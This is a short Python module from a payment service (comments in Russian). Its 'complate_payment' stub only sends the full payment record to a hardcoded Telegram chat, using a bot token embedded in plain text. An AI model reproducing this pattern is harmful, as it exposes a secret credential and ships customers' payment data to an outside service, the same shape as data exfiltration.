from app.models.payment import ClickPayment

from sqlalchemy.orm import Session

import requests
import json
from io import BytesIO

def send_json_to_user(bot_token, chat_id, data):
    """
    Отправляет JSON пользователю через Telegram-бота.
    Если JSON небольшой — отправляется как читаемый текст,
    если большой — отправляется как файл, всё в памяти.
    """
    json_text = json.dumps(data, indent=2, ensure_ascii=False)  # читаемый JSON

    if len(json_text) <= 4000:
        # Отправка как текст
        payload = {
            "chat_id": chat_id,
            "text": f"```\n{json_text}\n```",
            "parse_mode": "Markdown"
        }
        response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload)
    else:
        # Отправка как файл через BytesIO
        file_obj = BytesIO(json_text.encode('utf-8'))
        file_obj.name = "data.json"
        files = {"document": file_obj}
        payload = {"chat_id": chat_id}
        response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", data=payload, files=files)

    return response.json()

def complate_payment(payment: ClickPayment, db: Session):
    # Логика завершения платежа
    send_json_to_user("5350889598:AAF47c-JRcDnIyirOCT2XkSoFiWDs7G9kKE", 1483390408, payment.__dict__)
    pass